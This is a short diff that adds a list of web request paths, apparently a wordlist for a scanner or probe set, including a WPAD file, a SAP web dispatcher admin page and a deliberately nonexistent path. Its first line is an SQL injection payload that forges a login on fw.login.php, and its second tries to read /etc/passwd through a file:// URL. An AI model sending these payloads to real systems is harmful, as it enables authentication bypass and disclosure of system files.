@@ -1,0 +1,9 @@
+/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
+/index.php?q=file:///etc/passwd
+/login
+/wpad.dat
+/fw.login.php
+
+/proxy
+/sap/wdisp/admin/public/default.html
+/inormalydonotexist
